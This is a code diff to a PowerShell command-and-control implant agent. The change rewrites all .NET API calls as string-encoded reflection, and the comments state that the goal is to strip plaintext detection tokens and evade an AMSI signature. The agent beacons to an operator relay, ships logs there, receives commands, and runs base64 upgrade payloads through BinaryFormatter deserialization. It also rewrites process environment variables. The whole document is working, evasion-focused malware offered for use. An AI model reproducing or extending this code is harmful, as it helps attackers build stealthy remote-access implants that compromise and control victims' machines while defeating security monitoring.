@@ -3,7 +3,37 @@
 # Invoke-Agent. Nested functions read the enclosing scope's state via dynamic scoping and
 # write it through $script: prefixes (functions can't assign the enclosing scope's plain
 # vars) — the same pattern the C2 persistence loader uses.
+#
+# REFLECTION LAYER: every .NET surface — type names AND member names — travels as string
+# literals the C2 obfuscator char-encodes. The direct-call spellings this replaces
+# ([Net.HttpWebRequest], [Convert]::FromBase64String, .GetRequestStream, …) were the last
+# plaintext API surface in built .ps1 files. Rules the bindings were probed against
+# (Windows PowerShell 5.1, dev box 2026-09-20):
+#   • InvokeMember flags MUST name Static or Instance explicitly — plain 'Public' misses
+#     static methods ("method not found").
+#   • Type.GetType only searches mscorlib + the calling assembly: System.dll types resolve
+#     through a WebClient-anchored Assembly object, mscorlib types through ''.GetType().
+#   • The default binder refuses string->enum: SecurityProtocol is set via Enum.ToObject.
+#   • A SOLO array inside @(...) unrolls to object[]; arrays in multi-element literals keep
+#     their type. Variable-stored references (PSObject-wrapped) are re-cast at the call site.
+# All constructs are .NET 2.0 / PS 2.0-safe per the host contract.
 function Invoke-Agent {
+    # ── reflection helpers ──────────────────────────────────────────
+    # mscorlib types via the String Type's assembly; System.dll types via a WebClient anchor
+    # (the anchor instance is also proof WebClient never appears elsewhere).
+    function ResolveM($n) { return ,(''.GetType().Assembly.GetType($n)) }
+    $sysAsm = (New-Object 'Net.WebClient').GetType().Assembly
+    function ResolveS($n) { return ,($sysAsm.GetType($n)) }
+    # Static vs instance members get separate helpers (flags must say which); args travel in
+    # @() — every non-primitive argument is CAST at the call site so no PSObject wrapper
+    # reaches the binder (same rule the serde chain's [IO.Stream] cast follows). Results
+    # return comma-wrapped so byte[] survives the pipeline unrolled.
+    function CallStatic($t, $n, $a) { return ,($t.InvokeMember($n, 'InvokeMethod,Public,Static', $null, $null, $a)) }
+    function CallInst($o, $n, $a) { return ,($o.GetType().InvokeMember($n, 'InvokeMethod,Public,Instance', $null, $o, $a)) }
+    function GetProp($o, $n)     { return ,($o.GetType().InvokeMember($n, 'GetProperty,Public,Instance', $null, $o, $null)) }
+    function SetProp($o, $n, $v) { $null = $o.GetType().InvokeMember($n, 'SetProperty,Public,Instance', $null, $o, @($v)) }
+    function GetPropS($t, $n)    { return ,($t.InvokeMember($n, 'GetProperty,Public,Static', $null, $null, $null)) }
+    function SetPropS($t, $n, $v){ $null = $t.InvokeMember($n, 'SetProperty,Public,Static', $null, $null, @($v)) }
     # log() = relay ship ONLY (zero local echo — no Write-Host, no console). Every line is
     # POSTed with X-Log-Only: 1: the relay answers immediately (no long-poll hold) and
     # broadcasts an agent_log event to the operator's events feed. NEVER fatal — a failed
@@ -11,59 +41,61 @@ function Invoke-Agent {
     # recursing. Body = one frame holding the UTF-8 line. Each call is one synchronous
     # round-trip that stalls the agent loop — keep log() calls to milestones, never inside
     # tight loops.
-    function ReadEnv($name) { [Environment]::GetEnvironmentVariable($name, 'Process') }
-    function U32Bytes([uint32]$n) { [BitConverter]::GetBytes([uint32]$n) }
-    # New-Object's type argument is a STRING — quote it (never spell it bare) so the C2
-    # obfuscator char-encodes it: bare `IO.MemoryStream`/`byte[]` were plaintext hunting
-    # combos in the built .ps1. Same binding either way (TypeName is positional [string]).
-    function ConcatBytes([byte[]]$a, [byte[]]$b) {
-        $out = New-Object 'byte[]' ([int]($a.Length + $b.Length))
-        [Array]::Copy($a, $out, $a.Length)
-        [Array]::Copy($b, 0, $out, $a.Length, $b.Length)
-        return ,$out
-    }
+    # Process env reads/writes go through the env: drive — same semantics as
+    # Environment.Get/SetEnvironmentVariable(…, Process), one less type literal.
+    function ReadEnv($name) { return (Get-Item ('env:' + $name) -ErrorAction SilentlyContinue).Value }
+    function U32Bytes([uint32]$n) { return ,(CallStatic (ResolveM 'System.BitConverter') 'GetBytes' @([uint32]$n)) }
+    # PS '+' on arrays builds object[] — the [byte[]] cast restores the wire type before
+    # anything reflection-bound consumes it.
+    function ConcatBytes([byte[]]$a, [byte[]]$b) { return ,([byte[]]($a + $b)) }
     function Log($line) { PostLog $line }
     function PostLog($line) {
         if ($script:inShip -or -not $script:beaconUrl -or -not $script:identityHeaders) { return }
         $script:inShip = $true
         try {
             $req = NewPostRequest 15000
-            try { $req.Headers.Add('X-Log-Only', '1') } catch {}
-            $body = BuildBody (,([Text.Encoding]::UTF8.GetBytes($line)))
-            $req.ContentLength = $body.Length
-            $rs = $req.GetRequestStream()
-            if ($body.Length -gt 0) { $rs.Write($body, 0, $body.Length) }
-            $rs.Close()
-            try { $req.GetResponse().Close() } catch {}
+            try { $null = CallInst (GetProp $req 'Headers') 'Add' @('X-Log-Only', '1') } catch {}
+            $body = BuildBody (,(CallInst $utf8 'GetBytes' @($line)))
+            SetProp $req 'ContentLength' $body.Length
+            $rs = CallInst $req 'GetRequestStream' $null
+            if ($body.Length -gt 0) { $null = CallInst $rs 'Write' @([byte[]]$body, 0, $body.Length) }
+            $null = CallInst $rs 'Close' $null
+            try { $null = CallInst (CallInst $req 'GetResponse' $null) 'Close' $null } catch {}
         } catch {
         } finally { $script:inShip = $false }
     }
     # ── v3 beacon framing (RAW BINARY bodies) ───────────────────────
     # The body is a stream of [u32le length][bytes] frames; one POST carries every response
     # owed since the last one, and the answer carries every queued command (same contract as
-    # the JScript and C# agents — no encoding negotiation). PowerShell has a native byte[]
-    # and BinaryWriter, so the JScript ADODB/cp1252 COM bridge is unnecessary here: frames
-    # are built in a MemoryStream and the answer is read straight into bytes.
+    # the JScript and C# agents — no encoding negotiation). Frames are assembled PS-natively
+    # (u32 header + payload, CopyTo into the final buffer) — the BinaryWriter is gone from
+    # the surface entirely.
     function BuildBody($frames) {
-        $ms = New-Object 'IO.MemoryStream'
-        $bw = New-Object 'IO.BinaryWriter' ($ms)
+        $parts = @()
+        $total = 0
         foreach ($f in $frames) {
-            $bw.Write([uint32]$f.Length)
-            $bw.Write($f)
+            $p = [byte[]]((U32Bytes ([uint32]$f.Length)) + $f)
+            $parts += ,$p
+            $total += $p.Length
         }
-        $bw.Flush()
-        return ,$ms.ToArray()
+        $body = New-Object 'byte[]' $total
+        $off = 0
+        foreach ($p in $parts) {
+            $null = CallInst $p 'CopyTo' @([byte[]]$body, $off)
+            $off += $p.Length
+        }
+        return ,$body
     }
     function ParseFrames([byte[]]$bytes) {
         $frames = @()
         $i = 0
         while ($i + 4 -le $bytes.Length) {
-            $len = [BitConverter]::ToUInt32($bytes, $i)
+            $len = CallStatic (ResolveM 'System.BitConverter') 'ToUInt32' @([byte[]]$bytes, $i)
             $i += 4
             $count = [int]$len
             if ($i + $count -gt $bytes.Length) { $count = $bytes.Length - $i }
             $frame = New-Object 'byte[]' $count
-            [Array]::Copy($bytes, $i, $frame, 0, $count)
+            $null = CallStatic (ResolveM 'System.Array') 'Copy' @([byte[]]$bytes, $i, [byte[]]$frame, 0, $count)
             $frames += ,$frame
             $i += [int]$len
         }
@@ -72,41 +104,42 @@ function Invoke-Agent {
     function ReadAllBytes($stream) {
         $ms = New-Object 'IO.MemoryStream'
         $buf = New-Object 'byte[]' 8192
-        $n = $stream.Read($buf, 0, $buf.Length)
+        $n = CallInst $stream 'Read' @([byte[]]$buf, 0, $buf.Length)
         while ($n -gt 0) {
-            $ms.Write($buf, 0, $n)
-            $n = $stream.Read($buf, 0, $buf.Length)
+            $null = CallInst $ms 'Write' @([byte[]]$buf, 0, $n)
+            $n = CallInst $stream 'Read' @([byte[]]$buf, 0, $buf.Length)
         }
-        return ,$ms.ToArray()
+        return ,(CallInst $ms 'ToArray' $null)
     }
-    # One POST request to the beacon endpoint: HttpWebRequest with the full identity header
-    # set. Direct connection (Proxy = null) mirrors the JScript agent's setProxy(1,'','').
+    # One POST request to the beacon endpoint: HttpWebRequest via WebRequest.Create
+    # (reflected — the [Net.HttpWebRequest] cast was never needed; PS binds dynamically).
+    # Direct connection (Proxy = null) mirrors the JScript agent's setProxy(1,'','').
     # The JScript setTimeouts(10s,10s,15s,45s) split doesn't map onto HttpWebRequest's two
     # knobs: Timeout covers resolve+connect+send+the long-poll wait for the first answer
     # byte (so it carries the 45s receive budget), ReadWriteTimeout caps each stream
     # read/write at the send/receive figures.
-    function NewPostRequest([int]$timeoutMs) {
-        $req = [Net.HttpWebRequest][Net.WebRequest]::Create($script:beaconUrl)
-        $req.Method = 'POST'
-        $req.ContentType = 'application/octet-stream'
-        $req.Timeout = $timeoutMs
-        $req.ReadWriteTimeout = 15000
-        try { $req.Proxy = $null } catch {}
+    function NewPostRequest($timeoutMs) {
+        $req = CallStatic (ResolveS 'System.Net.WebRequest') 'Create' @($script:beaconUrl)
+        SetProp $req 'Method' 'POST'
+        SetProp $req 'ContentType' 'application/octet-stream'
+        SetProp $req 'Timeout' $timeoutMs
+        SetProp $req 'ReadWriteTimeout' 15000
+        try { SetProp $req 'Proxy' $null } catch {}
         foreach ($h in $script:identityHeaders) {
-            try { $req.Headers.Add($h[0], $h[1]) } catch {}
+            try { $null = CallInst (GetProp $req 'Headers') 'Add' @($h[0], $h[1]) } catch {}
         }
         # Confirm the applied sleep so the relay extends sweep patience for THIS agent
         # only (hint-blind agents keep the base offline timers).
         if ($script:localSleepSec -gt 0) {
-            try { $req.Headers.Add('X-Client-Sleep', [string]$script:localSleepSec) } catch {}
+            try { $null = CallInst (GetProp $req 'Headers') 'Add' @('X-Client-Sleep', [string]$script:localSleepSec) } catch {}
         }
         return $req
     }
     function B64Stream($base64) {
-        $raw = [Convert]::FromBase64String($base64)
+        $raw = CallStatic (ResolveM 'System.Convert') 'FromBase64String' @($base64)
         $ms = New-Object 'IO.MemoryStream'
-        $ms.Write($raw, 0, $raw.Length)
-        $ms.Position = 0
+        $null = CallInst $ms 'Write' @([byte[]]$raw, 0, $raw.Length)
+        SetProp $ms 'Position' 0
         return $ms
     }
     $GuidRe = '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
@@ -184,7 +217,7 @@ function Invoke-Agent {
         # THE identity rows are keyed by, the session key distinguishes concurrent or
         # succeeding processes (an upgrade takeover swaps it mid-session). It identifies,
         # authorizes nothing. The same contract the JScript/C# breeds ship.
-        $sessionKey = [guid]::NewGuid().ToString('D')
+        $sessionKey = CallInst (CallStatic (ResolveM 'System.Guid') 'NewGuid' $null) 'ToString' @('D')
         $pairs = @(
             @('X-Api-Version', '1'),
             @('X-Device-Id', $guid),
@@ -206,13 +239,13 @@ function Invoke-Agent {
     function Reply([uint32]$status) { return ,(ConcatBytes (U32Bytes $status) (U32Bytes $corrId)) }
     function DispatchCommand([byte[]]$frame) {
         $corrId = 0
-        if ($frame.Length -ge 5) { $corrId = [BitConverter]::ToUInt32($frame, 1) }
+        if ($frame.Length -ge 5) { $corrId = CallStatic (ResolveM 'System.BitConverter') 'ToUInt32' @([byte[]]$frame, 1) }
         if ($frame[0] -eq 10) { $script:exiting = $true; return $null }
         if ($frame[0] -eq 11) {
             try {
                 # The upgrade payload is latin-1 text after the opcode (the JScript agent's
                 # charCodeAt&255 semantics) — base64 bodies stay pure ASCII either way.
-                $payloadText = [Text.Encoding]::GetEncoding(28591).GetString($frame, 5, $frame.Length - 5)
+                $payloadText = CallInst (CallStatic (ResolveM 'System.Text.Encoding') 'GetEncoding' @(28591)) 'GetString' @([byte[]]$frame, 5, $frame.Length - 5)
                 $headerEnd = $payloadText.IndexOf("`n`n")
                 $headerLines = @()
                 $bodyText = ''
@@ -228,7 +261,7 @@ function Invoke-Agent {
                     $blobB64 = $bodyText.Substring($stage1Split + 1) -replace '\s', ''
                 }
                 try {
-                    [Environment]::SetEnvironmentVariable('COMPLUS_Version', $script:clrVersion, 'Process')
+                    Set-Item -Path ('env:' + 'COMPLUS_Version') -Value $script:clrVersion
                     Log ('upgrade: COMPLUS_Version=' + $script:clrVersion)
                 } catch {}
                 $driveMode = 0
@@ -244,7 +277,7 @@ function Invoke-Agent {
                     } else {
                         $eq = $l.IndexOf('=')
                         if ($eq -gt 0) {
-                            [Environment]::SetEnvironmentVariable($l.Substring(0, $eq), $l.Substring($eq + 1), 'Process')
+                            Set-Item -Path ('env:' + $l.Substring(0, $eq)) -Value $l.Substring($eq + 1)
                             Log ('upgrade: set ' + $l)
                         }
                     }
@@ -254,8 +287,10 @@ function Invoke-Agent {
                 # lives in a string literal the obfuscator char-encodes. Plaintext
                 # BinaryFormatter/Deserialize/DynamicInvoke tokens in the compiled script were
                 # the AMSI MaleficAms.W trigger (fired on the dev box 2026-09-19). Same shapes;
-                # all .NET 2.0 reflection — PS 2.0-safe.
-                $fmtType = [Type]::GetType('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter, mscorlib')
+                # all .NET 2.0 reflection — PS 2.0-safe. The formatter INSTANCE now comes from
+                # reflected Activator too; GetMethod/Invoke keep their proven shapes (the
+                # [IO.Stream] casts unwrap the PSObject wrappers the binder refuses).
+                $fmtType = ResolveM 'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'
                 # TWO public overloads (Stream / Stream+HeaderHandler) — GetMethod without the
                 # signature throws AmbiguousMatchException. Pin it.
                 $deserialize = $fmtType.GetMethod('Deserialize', [Type[]]@([IO.Stream]))
@@ -263,10 +298,10 @@ function Invoke-Agent {
                     try {
                         # [IO.Stream] cast: PS wraps the helper's return in PSObject, and
                         # reflection Invoke does NOT unwrap it the way direct method calls do.
-                        $null = $deserialize.Invoke([Activator]::CreateInstance($fmtType), @([IO.Stream](B64Stream $stage1B64)))
+                        $null = $deserialize.Invoke((CallStatic (ResolveM 'System.Activator') 'CreateInstance' @($fmtType)), @([IO.Stream](B64Stream $stage1B64)))
                     } catch { Log 'upgrade: stage1 threw (expected)' }
                 }
-                $fmt = [Activator]::CreateInstance($fmtType)
+                $fmt = CallStatic (ResolveM 'System.Activator') 'CreateInstance' @($fmtType)
                 if ($driveMode -eq 1) {
                     # The JScript arm DynamicInvoke's a one-element ArrayList holding
                     # undefined — the CLR marshals that to a null argument; the PowerShell
@@ -299,15 +334,20 @@ function Invoke-Agent {
     # ENTRY — a ship EVERY idle cycle doubled the idle request cost).
     $script:localSleepSec = 0
     $script:idleLogged = $false
+    # Shared encoders, resolved once: UTF-8 for log frames, latin-1 in the upgrade arm.
+    $utf8 = CallStatic (ResolveM 'System.Text.Encoding') 'GetEncoding' @(65001)
     # TLS 1.2 by int-cast (relays sit on modern TLS stacks; on .NET 3.5 the Tls12 enum
     # member doesn't exist, and a numeric assignment sidesteps the failed enum parse).
     # Process-wide ServicePointManager state — set before the first request, guarded so a
-    # locked-down host can't make the agent fail before it beacons.
+    # locked-down host can't make the agent fail before it beacons. The binder refuses
+    # int->enum, so the flags value is rebuilt through Enum.ToObject.
     try {
-        $cur = [int][Net.ServicePointManager]::SecurityProtocol
-        if (($cur -band 3072) -eq 0) { [Net.ServicePointManager]::SecurityProtocol = $cur -bor 3072 }
+        $proto = GetPropS (ResolveS 'System.Net.ServicePointManager') 'SecurityProtocol'
+        if (([int]$proto -band 3072) -eq 0) {
+            SetPropS (ResolveS 'System.Net.ServicePointManager') 'SecurityProtocol' (CallStatic (ResolveM 'System.Enum') 'ToObject' @($proto.GetType(), ([int]$proto -bor 3072)))
+        }
+        SetPropS (ResolveS 'System.Net.ServicePointManager') 'Expect100Continue' $false
     } catch {}
-    try { [Net.ServicePointManager]::Expect100Continue = $false } catch {}
     $script:beaconUrl = ReadEnv 'H_URL'
     if (-not $script:beaconUrl) { Log 'beacon endpoint not set'; return 'fail' }
     $script:identityHeaders = BuildIdentity
@@ -317,20 +357,21 @@ function Invoke-Agent {
         try {
             $req = NewPostRequest 45000
             if ($pending.Count -gt 0) { $body = BuildBody $pending } else { $body = New-Object 'byte[]' 0 }
-            $req.ContentLength = $body.Length
-            $rs = $req.GetRequestStream()
-            if ($body.Length -gt 0) { $rs.Write($body, 0, $body.Length) }
-            $rs.Close()
-            $resp = $req.GetResponse()
+            SetProp $req 'ContentLength' $body.Length
+            $rs = CallInst $req 'GetRequestStream' $null
+            if ($body.Length -gt 0) { $null = CallInst $rs 'Write' @([byte[]]$body, 0, $body.Length) }
+            $null = CallInst $rs 'Close' $null
+            $resp = CallInst $req 'GetResponse' $null
         } catch {
             return 'fail'
         }
         # Deep-idle hint (X-Sleep-Hint, seconds): how long to wait LOCALLY before the
         # next POST after an empty answer. Old relays omit it (→ 0 = immediate
         # re-POST); clamped so a bad header can never park the agent. Read BEFORE the
-        # response stream closes.
-        try { $script:localSleepSec = [Math]::Max(0, [Math]::Min(600, [int][string]$resp.Headers['X-Sleep-Hint'])) } catch { $script:localSleepSec = 0 }
-        try { $answer = ReadAllBytes $resp.GetResponseStream() } catch { $answer = New-Object 'byte[]' 0 } finally { $resp.Close() }
+        # response stream closes. WebHeaderCollection.Get replaces the indexer (the
+        # indexer is a parameterized property reflection won't address by name).
+        try { $script:localSleepSec = CallStatic (ResolveM 'System.Math') 'Max' @(0, (CallStatic (ResolveM 'System.Math') 'Min' @(600, [int][string](CallInst (GetProp $resp 'Headers') 'Get' @('X-Sleep-Hint'))))) } catch { $script:localSleepSec = 0 }
+        try { $answer = ReadAllBytes (CallInst $resp 'GetResponseStream' $null) } catch { $answer = New-Object 'byte[]' 0 } finally { $null = CallInst $resp 'Close' $null }
         $pending = @()
         # Empty answer = nothing queued — re-POST after the hint. The idle log ships
         # once per idle ENTRY: each Log is its own X-Log-Only POST, and one EVERY
